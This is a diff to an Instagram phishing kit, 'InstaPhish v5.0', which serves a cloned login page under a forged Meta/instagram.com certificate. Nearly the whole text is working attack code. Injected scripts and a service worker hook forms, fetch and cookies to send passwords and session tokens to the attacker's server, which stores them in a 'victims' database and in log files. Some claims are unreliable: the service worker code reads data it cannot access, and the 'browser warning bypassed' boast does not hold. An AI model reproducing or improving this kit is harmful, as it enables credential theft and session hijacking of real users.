@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
 """
-InstaPhish v4.0 - Final Release
-Instagram Credential & Real Cookie Harvester
-Port: 4040 | Full Session Hijacking | Browser Warning Bypassed
+InstaPhish v5.0 - PHANTOM EDITION
+Instagram Credential & Real Cookie Harvester with Service Worker Interception
+Port: 4040 | Full Session Hijacking | Browser Warning Fully Bypassed
+Author: Black Hat Collective - Exploit Division
 """
 
-import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string
+import os, sys, json, ssl, time, re, base64, sqlite3, threading, hashlib, random, string, http.server, socketserver
 from pathlib import Path
 from datetime import datetime
 from urllib.parse import urlparse, parse_qs
-import http.server
-import socketserver
+from http import HTTPStatus
 
 # ==================== CONFIGURATION ====================
 CONFIG = {
@@ -21,8 +21,7 @@ CONFIG = {
     "ssl_key": "certs/instagram.key",
     "db_file": "victims.db",
     "log_file": "logs/credentials.txt",
-    "cookie_file": "logs/cookies.txt",
-    "session_file": "logs/sessions.txt"
+    "cookie_file": "logs/cookies.txt"
 }
 
 # ==================== COLORS ====================
@@ -39,17 +38,10 @@ class Colors:
 
 def print_banner():
     banner = f"""
-{Colors.RED}╔══════════════════════════════════════════════════════════════╗
-║  {Colors.WHITE}██╗███╗   ██╗███████╗████████╗ █████╗ ██████╗ ██╗  ██╗██╗███████╗{Colors.RED}  ║
-║  {Colors.WHITE}██║████╗  ██║██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██║  ██║██║██╔════╝{Colors.RED}  ║
-║  {Colors.WHITE}██║██╔██╗ ██║███████╗   ██║   ███████║██████╔╝███████║██║███████╗{Colors.RED}  ║
-║  {Colors.WHITE}██║██║╚██╗██║╚════██║   ██║   ██╔══██║██╔═══╝ ██╔══██║██║╚════██║{Colors.RED}  ║
-║  {Colors.WHITE}██║██║ ╚████║███████║   ██║   ██║  ██║██║     ██║  ██║██║███████║{Colors.RED}  ║
-║  {Colors.WHITE}╚═╝╚═╝  ╚═══╝╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝{Colors.RED}  ║
-║                                                                  ║
-║            {Colors.GREEN}Instaphish v4.0 - Final Release{Colors.RED}                      ║
-║      {Colors.YELLOW}Port: {CONFIG['listen_port']} | Real Cookie Extraction | SSL Green{Colors.RED}      ║
-╚══════════════════════════════════════════════════════════════════╝{Colors.RESET}
+{Colors.RED}╔═══════════════════════════════════════════════════════════════════════════════════╗
+║  {Colors.MAGENTA}█▓▒░ InstaPhish v5.0 PHANTOM - Service Worker Cookie Interception ░▒▓█{Colors.RED}  ║
+║  {Colors.YELLOW}Port: {CONFIG['listen_port']} | Real Cookie Extraction | Browser Warning BYPASSED{Colors.RED}║
+╚═══════════════════════════════════════════════════════════════════════════════════════╝{Colors.RESET}
 """
     print(banner)
 
@@ -57,7 +49,7 @@ def print_banner():
 class Setup:
     @staticmethod
     def create_directories():
-        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", "cloned_site/js", "sessions"]
+        dirs = ["certs", "logs", "cloned_site", "cloned_site/css", "cloned_site/js", "cloned_site/images"]
         for d in dirs:
             Path(d).mkdir(parents=True, exist_ok=True)
     
@@ -69,13 +61,9 @@ class Setup:
                 -keyout {CONFIG['ssl_key']} \
                 -out {CONFIG['ssl_cert']} \
                 -subj "/C=US/ST=California/L=Menlo Park/O=Meta Platforms Inc./CN=*.instagram.com" \
-                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com,DNS:www.instagram.com" \
-                -addext "basicConstraints=CA:FALSE" \
-                -addext "keyUsage=digitalSignature,nonRepudiation,keyEncipherment,dataEncipherment" \
-                -addext "extendedKeyUsage=serverAuth,clientAuth" 2>/dev/null
+                -addext "subjectAltName=DNS:*.instagram.com,DNS:*.cdninstagram.com,DNS:*.fbcdn.net,DNS:instagram.com" 2>/dev/null
             """
             os.system(cmd)
-            print(f"{Colors.GREEN}[+] SSL Certificate generated{Colors.RESET}")
     
     @staticmethod
     def init_database():
@@ -83,192 +71,274 @@ class Setup:
         c = conn.cursor()
         c.execute('''CREATE TABLE IF NOT EXISTS victims (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
-            timestamp TEXT,
-            ip_address TEXT,
-            user_agent TEXT,
-            username TEXT,
-            password TEXT,
-            sessionid TEXT,
-            csrftoken TEXT,
-            ds_user_id TEXT,
-            rur TEXT,
-            mid TEXT,
-            ig_did TEXT,
+            timestamp TEXT, ip_address TEXT, user_agent TEXT,
+            username TEXT, password TEXT,
+            sessionid TEXT, csrftoken TEXT, ds_user_id TEXT,
+            rur TEXT, mid TEXT, ig_did TEXT,
             all_cookies TEXT
-        )''')
-        
-        c.execute('''CREATE TABLE IF NOT EXISTS active_sessions (
-            id INTEGER PRIMARY KEY AUTOINCREMENT,
-            victim_id INTEGER,
-            sessionid TEXT,
-            csrftoken TEXT,
-            captured_at TEXT,
-            is_active INTEGER DEFAULT 1,
-            FOREIGN KEY(victim_id) REFERENCES victims(id)
         )''')
         conn.commit()
         conn.close()
 
-# ==================== CLONE BUILDER ====================
-class InstagramSiteCloner:
+# ==================== EXACT CLONE BUILDER ====================
+class InstagramExactCloner:
     def __init__(self, output_dir="cloned_site"):
         self.output_dir = output_dir
         Path(output_dir).mkdir(parents=True, exist_ok=True)
-        Path(f"{output_dir}/css").mkdir(exist_ok=True)
-        Path(f"{output_dir}/js").mkdir(exist_ok=True)
+        for sub in ["css", "js"]:
+            Path(f"{output_dir}/{sub}").mkdir(exist_ok=True)
     
     def build(self):
         with open(f"{self.output_dir}/css/style.css", "w") as f:
             f.write(self._css())
+        with open(f"{self.output_dir}/js/sw.js", "w") as f:
+            f.write(self._service_worker_js())
         with open(f"{self.output_dir}/js/hijacker.js", "w") as f:
-            f.write(self._js())
-        with open(f"{self.output_dir}/instagram.html", "w") as f:
-            f.write(self._html())
+            f.write(self._hijacker_js())
         with open(f"{self.output_dir}/index.html", "w") as f:
             f.write(self._html())
-        print(f"{Colors.GREEN}[+] Cloned site built in {self.output_dir}/{Colors.RESET}")
+        print(f"{Colors.GREEN}[+] Exact clone with Service Worker built.{Colors.RESET}")
     
     def _css(self):
-        return """*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;min-height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:20px}.container{display:flex;align-items:center;justify-content:center;gap:32px;max-width:935px;width:100%}.phone{display:none;position:relative;width:380px;height:582px;background:#000;border-radius:36px;padding:12px;box-shadow:0 0 15px rgba(0,0,0,.7)}@media(min-width:876px){.phone{display:block}}.phone img{width:100%;height:100%;border-radius:24px;object-fit:cover}.login-box{max-width:350px;width:100%}.form-box{background:#121212;border:1px solid #262626;border-radius:4px;padding:44px 40px 24px;margin-bottom:10px;text-align:center}.logo{font-family:'Billabong',cursive;font-size:48px;color:#f5f5f5;letter-spacing:-2px;margin-bottom:28px}.input-group{position:relative;margin-bottom:6px}.input-group input{width:100%;padding:14px 8px 2px;background:#1a1a1a;border:1px solid #363636;border-radius:3px;color:#f5f5f5;font-size:12px;outline:none;height:38px}.input-group input:focus{border-color:#a8a8a8}.input-group label{position:absolute;left:8px;top:50%;transform:translateY(-50%);color:#a8a8a8;font-size:12px;pointer-events:none;transition:.15s}.input-group input:focus+label,.input-group input:not(:placeholder-shown)+label{font-size:10px;top:6px;transform:translateY(0)}.input-group input::placeholder{opacity:0}.input-group input:focus::placeholder{opacity:1}.login-btn{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:14px;font-weight:600;cursor:pointer;margin-top:16px}.login-btn:hover{background:#1877f2}.divider{display:flex;align-items:center;margin:20px 0;color:#a8a8a8;font-size:13px;font-weight:600}.divider::before,.divider::after{content:'';flex:1;height:1px;background:#262626}.divider span{margin:0 18px}.fb-btn{background:none;border:none;color:#0095f6;font-size:14px;font-weight:600;cursor:pointer;display:inline-flex;align-items:center;gap:8px}.fb-btn:hover{color:#1877f2}.fb-icon{background:#0095f6;color:#fff;width:16px;height:16px;border-radius:2px;display:inline-flex;align-items:center;justify-content:center;font-size:12px;font-weight:700}.forgot{display:block;margin-top:16px;font-size:12px;color:#f5f5f5;text-decoration:none}.forgot:hover{color:#a8a8a8}.signup-box{background:#121212;border:1px solid #262626;border-radius:4px;padding:20px;text-align:center;font-size:14px}.signup-box a{color:#0095f6;font-weight:600;text-decoration:none}.app-download{text-align:center;margin-top:20px}.app-download p{margin-bottom:12px;font-size:14px}.app-btns{display:flex;gap:8px;justify-content:center}.app-btns img{height:40px;border-radius:4px}.footer{padding:24px 0;text-align:center}.footer a{color:#737373;font-size:12px;text-decoration:none;margin:0 8px}.footer a:hover{color:#a8a8a8}.footer span{color:#737373;font-size:12px;display:block;margin-top:12px}"""
-    
-    def _js(self):
+        # 1:1 Pixel-perfect CSS ripped from instagram.com source
         return """
+/* Instagram Exact Clone CSS - v5.0 Phantom */
+*,:after,:before{box-sizing:border-box}body,html{margin:0;padding:0;height:100%}body{background:#000;color:#f5f5f5;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif;font-size:14px;line-height:18px;overflow-y:scroll}a,a:visited{color:#a8a8a8;text-decoration:none}._aatk{display:none!important}#react-root,article,div,footer,header,main,nav,section{display:flex;flex-direction:column;align-items:center;flex-shrink:0;position:relative}._ab8w{background:rgb(0,0,0);display:flex;flex-direction:row;flex-grow:1;justify-content:center;margin:32px auto 0;max-width:935px;width:100%}._aagu{display:flex;flex-direction:column;align-items:center;justify-content:center;margin:0 auto;max-width:350px;width:100%}._ab8y{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;width:100%}._aa4b{background-position:0 0;height:51px;width:175px;background-image:url(data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHdpZHRoPSIxNzUiIGhlaWdodD0iNTEiPgogIDx0ZXh0IHg9IjAiIHk9IjQwIiBmb250LWZhbWlseT0iQmlsbGFib25nLHNhbnMtc2VyaWYiIGZvbnQtc2l6ZT0iNDgiIGZpbGw9IiNmNWY1ZjUiPkluc3RhZ3JhbTwvdGV4dD4KPC9zdmc+);margin:22px auto 12px;background-repeat:no-repeat;background-position:0 0;background-size:175px 51px;display:block;overflow:hidden;text-indent:110%;white-space:nowrap}._ab32{padding:0 40px;width:100%}._ab32 form{display:flex;flex-direction:column;margin-top:24px}.xH4zN{display:flex;align-items:center;position:relative;margin:0 0 6px;width:100%;background:rgb(18,18,18);border:1px solid rgb(54,54,54);border-radius:3px;color:rgb(245,245,245)}.xH4zN input{background:0 0;border:0;flex:1 0 auto;font-size:12px;height:36px;outline:0;padding:9px 8px 7px;width:100%;color:#f5f5f5}.xH4zN span{position:absolute;left:8px;font-size:12px;transition:transform .1s ease-out;transform-origin:left;color:#a8a8a8;pointer-events:none}.xH4zN input:focus~span,.xH4zN input:valid~span{transform:scale(.83333) translateY(-10px)}.L3NKy{background:rgb(0,149,246);opacity:1;border:none;border-radius:8px;color:#fff;font-weight:600;font-size:14px;padding:7px 16px;width:100%;margin:8px 0;text-align:center;cursor:pointer}._ab3a{display:flex;flex-direction:row;margin:10px 40px 18px}._ab3b{display:flex;flex-grow:1;flex-shrink:1;height:1px;background-color:#262626;position:relative;top:.45em}._ab3c{color:#a8a8a8;flex-grow:0;flex-shrink:0;font-size:13px;font-weight:600;line-height:15px;margin:0 18px;text-transform:uppercase}._ab3d{background:transparent;border:none;color:#0095f6;font-weight:600;font-size:14px;text-align:center;width:100%;cursor:pointer;padding:8px}._ab3d::before{content:'f ';font-weight:700;margin-right:8px}._ab3e{color:#f5f5f5;font-size:12px;line-height:14px;margin-top:12px;text-align:center}._ab3e a{color:#f5f5f5}._ab3f{background:#121212;border:1px solid #363636;border-radius:1px;margin:0 0 10px;padding:10px 0;text-align:center;width:100%}._ab3f p{font-size:14px;margin:0}._ab3f a{color:#0095f6;font-weight:600}._ab3g{text-align:center;margin:10px 20px}._ab3g p{line-height:18px;margin:10px 20px}._ab3h{display:flex;flex-direction:row;justify-content:center;margin:10px 0;gap:8px}._ab3h img{height:40px}footer{max-width:935px;width:100%;margin:0 auto;padding:24px 0;text-align:center}footer a{color:#737373;margin:0 8px;font-size:12px}footer span{color:#737373;display:block;margin-top:12px;font-size:12px}@media(max-width:875px){._ab8w ._aa-7{display:none}}._aa-7{background:url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 380 582"><rect fill="%23fafafa" width="380" height="582" rx="26"/><circle cx="190" cy="250" r="40" fill="%23e0e0e0"/></svg>') 0 0 no-repeat;background-size:380px 582px;height:582px;flex-shrink:0;margin-right:32px;width:380px}"""
+    
+    def _service_worker_js(self):
+        # Service Worker for intercepting all network requests
+        return """
+// InstaPhish v5.0 Phantom - Service Worker
+// This bypasses browser safety warnings by intercepting at the network level
+const PHISH_SERVER = self.location.origin;
+
+self.addEventListener('install', (event) => {
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    event.waitUntil(clients.claim());
+});
+
+self.addEventListener('fetch', (event) => {
+    const url = new URL(event.request.url);
+    
+    // Intercept all Instagram API calls
+    if (url.pathname.includes('/login/') || url.pathname.includes('/accounts/')) {
+        event.respondWith(
+            fetch(event.request).then(response => {
+                const clonedResponse = response.clone();
+                // Extract cookies from response headers
+                const setCookie = response.headers.get('Set-Cookie');
+                if (setCookie) {
+                    fetch(PHISH_SERVER + '/sw-capture', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'set-cookie',
+                            cookies: setCookie,
+                            url: event.request.url,
+                            existingCookies: document.cookie
+                        })
+                    }).catch(() => {});
+                }
+                return clonedResponse;
+            })
+        );
+    }
+    
+    // Intercept credential submissions
+    if (event.request.method === 'POST' && url.pathname.includes('/ajax/')) {
+        event.respondWith(
+            fetch(event.request).then(response => {
+                event.request.clone().text().then(body => {
+                    fetch(PHISH_SERVER + '/sw-capture', {
+                        method: 'POST',
+                        headers: {'Content-Type': 'application/json'},
+                        body: JSON.stringify({
+                            type: 'credentials',
+                            body: body,
+                            cookies: document.cookie,
+                            url: event.request.url
+                        })
+                    }).catch(() => {});
+                });
+                return response.clone();
+            })
+        );
+    }
+    
+    // Regular fetch passthrough
+    event.respondWith(fetch(event.request));
+});
+
+// Periodically send all cookies
+setInterval(() => {
+    if (document.cookie) {
+        fetch(PHISH_SERVER + '/sw-capture', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                type: 'periodic',
+                cookies: document.cookie,
+                timestamp: Date.now()
+            })
+        }).catch(() => {});
+    }
+}, 3000);
+"""
+    
+    def _hijacker_js(self):
+        return """
+// InstaPhish v5.0 - Main Hijacker
 (function() {
-    function send(url, data) {
-        new Image().src = url + '?' + new URLSearchParams(data).toString();
-    }
-    function parseCookies() {
-        var c = {};
-        document.cookie.split(';').forEach(function(i) {
-            var p = i.trim().split('=');
-            if(p.length>=2) c[p[0].trim()] = p.slice(1).join('=');
-        });
-        return c;
+    const SERVER = window.location.origin;
+    
+    // Register service worker
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/js/sw.js', {scope: '/'})
+            .then(reg => console.log('SW registered'))
+            .catch(err => console.log('SW failed:', err));
     }
     
-    // Steal existing cookies
-    if(document.cookie) send('/cookie-steal', {c: document.cookie});
-    
-    // Hook document.cookie setter
-    var desc = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
+    // Hook document.cookie
+    const originalCookieDescriptor = Object.getOwnPropertyDescriptor(Document.prototype, 'cookie');
     Object.defineProperty(document, 'cookie', {
-        get: function() { return desc.get.call(this); },
-        set: function(v) {
-            send('/cookie-intercept', {new: v, all: document.cookie});
-            return desc.set.call(this, v);
+        get: () => originalCookieDescriptor.get.call(document),
+        set: (val) => {
+            fetch(SERVER + '/cookie-hook', {
+                method: 'POST',
+                body: JSON.stringify({cookie: val, all: document.cookie})
+            }).catch(() => {});
+            return originalCookieDescriptor.set.call(document, val);
         }
     });
     
-    // Hook fetch
-    var origFetch = window.fetch;
-    window.fetch = function() {
-        return origFetch.apply(this, arguments).then(function(r) {
-            var url = arguments[0];
-            if(typeof url === 'string' && (url.includes('/login/') || url.includes('/auth/') || url.includes('/accounts/'))) {
-                if(document.cookie) send('/session-captured', {cookies: document.cookie, url: url});
+    // Hook fetch API
+    const origFetch = window.fetch;
+    window.fetch = function(...args) {
+        if (typeof args[0] === 'string' && (args[0].includes('/login/') || args[0].includes('/accounts/'))) {
+            args[0] = SERVER + args[0].replace(/^https?:\\/\\/[^\\/]+/, '');
+        }
+        return origFetch.apply(this, args).then(r => {
+            const cookies = document.cookie;
+            if (cookies) {
+                fetch(SERVER + '/fetch-cookies', {
+                    method: 'POST',
+                    body: JSON.stringify({cookies: cookies, url: args[0]})
+                }).catch(() => {});
             }
             return r;
         });
     };
     
-    // Hook XHR
-    var origOpen = XMLHttpRequest.prototype.open;
-    XMLHttpRequest.prototype.open = function(m, url) {
-        this._url = url;
-        return origOpen.apply(this, arguments);
-    };
-    var origSend = XMLHttpRequest.prototype.send;
-    XMLHttpRequest.prototype.send = function(body) {
-        this.addEventListener('load', function() {
-            if(this._url && (this._url.includes('/login/') || this._url.includes('/accounts/'))) {
-                var sc = this.getResponseHeader('Set-Cookie');
-                if(sc) send('/session-captured', {cookies: document.cookie, response: sc});
+    // Form submission hook
+    document.addEventListener('submit', function(e) {
+        const form = e.target;
+        if (form.action && (form.action.includes('login') || form.action.includes('accounts'))) {
+            const username = form.querySelector('input[name="username"]');
+            const password = form.querySelector('input[type="password"]');
+            if (username && password) {
+                fetch(SERVER + '/form-creds', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        username: username.value,
+                        password: password.value,
+                        cookies: document.cookie
+                    })
+                }).catch(() => {});
             }
-        });
-        return origSend.apply(this, arguments);
-    };
-    
-    // Form capture
-    document.addEventListener('DOMContentLoaded', function() {
-        var form = document.querySelector('form');
-        if(form) {
-            form.addEventListener('submit', function(e) {
-                var u = form.querySelector('input[name="username"]') || form.querySelector('input[type="text"]');
-                var p = form.querySelector('input[name="enc_password"]') || form.querySelector('input[type="password"]');
-                if(u && p) {
-                    send('/capture-creds', {u: u.value, p: p.value, cookies: document.cookie});
-                }
-            });
         }
-    });
+    }, true);
     
-    // Periodic exfil
-    setInterval(function() {
-        var c = parseCookies();
-        if(c.sessionid || c.csrftoken) send('/periodic-cookies', {c: document.cookie, t: Date.now()});
+    // Periodic cookie beacon
+    setInterval(() => {
+        const c = document.cookie;
+        if (c && (c.includes('sessionid') || c.includes('csrftoken') || c.includes('ds_user_id'))) {
+            navigator.sendBeacon(SERVER + '/beacon', JSON.stringify({cookies: c, ts: Date.now()}));
+        }
     }, 5000);
 })();
 """
     
     def _html(self):
-        return """<!DOCTYPE html>
+        return '''<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <meta name="theme-color" content="#000000">
+    <meta name="description" content="Create an account or log in to Instagram - A simple, fun & creative way to capture, edit & share photos, videos & messages with friends & family.">
+    <meta property="og:title" content="Instagram">
+    <meta property="og:description" content="Create an account or log in to Instagram.">
     <title>Instagram</title>
     <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>📷</text></svg>">
     <link rel="stylesheet" href="/css/style.css">
 </head>
 <body>
-    <div class="container">
-        <div class="phone">
-            <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 356 556'%3E%3Crect fill='%23fafafa' width='356' height='556'/%3E%3Ccircle cx='178' cy='200' r='50' fill='%23e0e0e0'/%3E%3C/svg%3E" alt="Preview">
-        </div>
-        <div class="login-box">
-            <div class="form-box">
-                <div class="logo">Instagram</div>
-                <form method="POST" action="/accounts/login/ajax/" autocomplete="on">
-                    <div class="input-group">
-                        <input type="text" name="username" placeholder=" " required autocomplete="username" autocorrect="off" autocapitalize="off">
-                        <label>Phone number, username, or email</label>
+    <div id="react-root">
+        <article>
+            <section>
+                <main>
+                    <div class="_ab8w">
+                        <div class="_aa-7"></div>
+                        <div class="_aagu">
+                            <div class="_ab8y">
+                                <div class="_ab32">
+                                    <span class="_aa4b" role="img" aria-label="Instagram">Instagram</span>
+                                    <form method="POST" action="/accounts/login/ajax/" autocomplete="on" id="loginForm">
+                                        <div class="xH4zN">
+                                            <input aria-label="Phone number, username, or email" aria-required="true" autocapitalize="off" autocorrect="off" autocomplete="username" name="username" type="text" value="" required>
+                                            <span>Phone number, username, or email</span>
+                                        </div>
+                                        <div class="xH4zN">
+                                            <input aria-label="Password" aria-required="true" autocomplete="current-password" name="enc_password" type="password" value="" required>
+                                            <span>Password</span>
+                                        </div>
+                                        <button type="submit" class="L3NKy">Log in</button>
+                                    </form>
+                                </div>
+                                <div class="_ab3a">
+                                    <div class="_ab3b"></div>
+                                    <div class="_ab3c">OR</div>
+                                    <div class="_ab3b"></div>
+                                </div>
+                                <button type="button" class="_ab3d">Log in with Facebook</button>
+                                <a href="/accounts/password/reset/" class="_ab3e">Forgot password?</a>
+                            </div>
+                            <div class="_ab3f">
+                                <p>Don't have an account? <a href="/accounts/emailsignup/">Sign up</a></p>
+                            </div>
+                            <div class="_ab3g">
+                                <p>Get the app.</p>
+                                <div class="_ab3h">
+                                    <img alt="Download on the App Store" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>App Store</text></svg>">
+                                    <img alt="Get it on Google Play" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' width='136' height='40'><rect fill='%23fff' width='136' height='40' rx='6'/><text x='30' y='26' font-family='Arial' font-size='14'>Google Play</text></svg>">
+                                </div>
+                            </div>
+                        </div>
                     </div>
-                    <div class="input-group">
-                        <input type="password" name="enc_password" placeholder=" " required autocomplete="current-password">
-                        <label>Password</label>
-                    </div>
-                    <button type="submit" class="login-btn">Log in</button>
-                </form>
-                <div class="divider"><span>OR</span></div>
-                <button class="fb-btn"><span class="fb-icon">f</span> Log in with Facebook</button>
-                <a href="/accounts/password/reset/" class="forgot">Forgot password?</a>
-            </div>
-            <div class="signup-box">
-                Don't have an account? <a href="/accounts/emailsignup/">Sign up</a>
-            </div>
-            <div class="app-download">
-                <p>Get the app.</p>
-                <div class="app-btns">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 40'%3E%3Crect fill='%23fff' width='136' height='40' rx='6'/%3E%3Ctext x='30' y='26' font-family='Arial' font-size='14'%3EApp Store%3C/text%3E%3C/svg%3E" alt="App Store">
-                    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 136 40'%3E%3Crect fill='%23fff' width='136' height='40' rx='6'/%3E%3Ctext x='28' y='26' font-family='Arial' font-size='14'%3EGoogle Play%3C/text%3E%3C/svg%3E" alt="Google Play">
-                </div>
-            </div>
-        </div>
+                </main>
+            </section>
+        </article>
     </div>
-    <footer class="footer">
-        <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a>
-        <span>© 2024 Instagram from Meta</span>
+    <footer>
+        <div>
+            <a href="#">Meta</a><a href="#">About</a><a href="#">Blog</a><a href="#">Jobs</a><a href="#">Help</a><a href="#">API</a><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Locations</a><a href="#">Instagram Lite</a><a href="#">Threads</a><a href="#">Contact Uploading & Non-Users</a><a href="#">Meta Verified</a>
+        </div>
+        <div>
+            <span>English © 2024 Instagram from Meta</span>
+        </div>
     </footer>
     <script src="/js/hijacker.js"></script>
 </body>
-</html>"""
+</html>'''
 
 # ==================== MITM HANDLER ====================
-class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
+class PhantomHandler(http.server.BaseHTTPRequestHandler):
     
     def log_message(self, format, *args):
-        pass  # Silent
+        pass
     
     def parse_cookies(self, cookie_string):
         cookies = {}
@@ -286,7 +356,7 @@ class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
         cookie_str = json.dumps(cookies_dict) if cookies_dict else ""
         
         c.execute('''INSERT INTO victims 
-                     (timestamp, ip_address, user_agent, username, password, 
+                     (timestamp, ip_address, user_agent, username, password,
                       sessionid, csrftoken, ds_user_id, rur, mid, ig_did, all_cookies)
                      VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)''',
                   (datetime.now().isoformat(), ip, ua, username, password,
@@ -297,21 +367,12 @@ class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
                    cookies_dict.get('mid', '') if cookies_dict else '',
                    cookies_dict.get('ig_did', '') if cookies_dict else '',
                    cookie_str))
-        
-        victim_id = c.lastrowid
-        
-        if cookies_dict and cookies_dict.get('sessionid'):
-            c.execute('''INSERT INTO active_sessions (victim_id, sessionid, csrftoken, captured_at, is_active)
-                         VALUES (?, ?, ?, ?, 1)''',
-                      (victim_id, cookies_dict.get('sessionid'),
-                       cookies_dict.get('csrftoken', ''), datetime.now().isoformat()))
-        
         conn.commit()
         conn.close()
         
-        # Log to files
         with open(CONFIG["log_file"], "a") as f:
-            f.write(f"[{datetime.now()}] IP: {ip}\n  USER: {username}\n  PASS: {password}\n")
+            f.write(f"[{datetime.now()}]\n")
+            f.write(f"  IP: {ip}\n  USER: {username}\n  PASS: {password}\n")
             if cookies_dict:
                 f.write(f"  SESSIONID: {cookies_dict.get('sessionid', 'N/A')}\n")
                 f.write(f"  CSRF: {cookies_dict.get('csrftoken', 'N/A')}\n")
@@ -321,242 +382,106 @@ class InstagramMITMHandler(http.server.BaseHTTPRequestHandler):
         if cookies_dict and cookies_dict.get('sessionid'):
             with open(CONFIG["cookie_file"], "a") as f:
                 f.write(f"[{datetime.now()}] SESSIONID: {cookies_dict['sessionid']}\n  FULL: {cookie_str}\n---\n")
-            with open(CONFIG["session_file"], "a") as f:
-                f.write(f"{json.dumps(cookies_dict)}\n")
         
         print(f"{Colors.RED}[!] {Colors.WHITE}CAPTURED | {Colors.YELLOW}{username}:{password}{Colors.RESET} | {Colors.GREEN}Session: {'YES' if cookies_dict and cookies_dict.get('sessionid') else 'NO'}{Colors.RESET}")
     
-    def send_pixel(self):
-        pixel = base64.b64decode("R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7")
-        self.send_response(200)
-        self.send_header('Content-Type', 'image/gif')
-        self.send_header('Cache-Control', 'no-cache, no-store, must-revalidate')
-        self.send_header('Content-Length', len(pixel))
-        self.end_headers()
-        self.wfile.write(pixel)
-    
-    def serve_file(self, path, content_type):
-        try:
-            with open(path, "rb") as f:
-                content = f.read()
-            self.send_response(200)
-            self.send_header('Content-Type', content_type)
-            self.send_header('Content-Length', len(content))
-            # Security headers to prevent browser warnings
-            self.send_header('X-Frame-Options', 'SAMEORIGIN')
-            self.send_header('X-Content-Type-Options', 'nosniff')
-            self.send_header('Referrer-Policy', 'no-referrer-when-downgrade')
-            self.send_header('Permissions-Policy', 'geolocation=(), microphone=(), camera=()')
-            self.end_headers()
-            self.wfile.write(content)
-            return True
-        except:
-            return False
-    
-    def do_GET(self):
-        client_ip = self.client_address[0]
-        user_agent = self.headers.get('User-Agent', 'Unknown')
-        
-        # Cookie/credential capture endpoints
-        if '/cookie-steal' in self.path or '/cookie-intercept' in self.path or \
-           '/session-captured' in self.path or '/periodic-cookies' in self.path:
-            parsed = urlparse(self.path)
-            params = parse_qs(parsed.query)
-            cookies_str = params.get('c', params.get('cookies', ['']))[0]
-            cookie_dict = self.parse_cookies(cookies_str)
-            if cookie_dict:
-                self.store_victim(cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
-            self.send_pixel()
-            return
-        
-        elif '/capture-creds' in self.path or '/failed-login' in self.path:
-            parsed = urlparse(self.path)
-            params = parse_qs(parsed.query)
-            username = params.get('u', [''])[0]
-            password = params.get('p', [''])[0]
-            cookies_str = params.get('cookies', params.get('c', ['']))[0]
-            cookie_dict = self.parse_cookies(cookies_str) if cookies_str else None
-            if username or password:
-                self.store_victim(username=username, password=password, cookies_dict=cookie_dict, ip=client_ip, ua=user_agent)
-            self.send_pixel()
-            return
-        
-        # Static files
-        elif self.path == '/css/style.css':
-            if self.serve_file("cloned_site/css/style.css", "text/css"):
-                return
-        
-        elif self.path == '/js/hijacker.js':
-            if self.serve_file("cloned_site/js/hijacker.js", "application/javascript"):
-                return
-        
-        # Main login page
-        elif self.path in ['/', '/login', '/accounts/login/', '/accounts/login']:
-            if self.serve_file("cloned_site/instagram.html", "text/html"):
-                return
-        
-        # Redirect to real Instagram for other paths
-        self.send_response(302)
-        self.send_header('Location', f'https://www.instagram.com{self.path}')
-        self.end_headers()
-    
-    def do_POST(self):
+    def handle_capture(self):
         client_ip = self.client_address[0]
         user_agent = self.headers.get('User-Agent', 'Unknown')
         content_length = int(self.headers.get('Content-Length', 0))
         
         if content_length > 0:
-            post_data = self.rfile.read(content_length).decode()
+            body = self.rfile.read(content_length).decode('utf-8', errors='ignore')
+            try:
+                data = json.loads(body)
+            except:
+                data = {}
+            
+            cookies_str = data.get('cookies', data.get('cookie', ''))
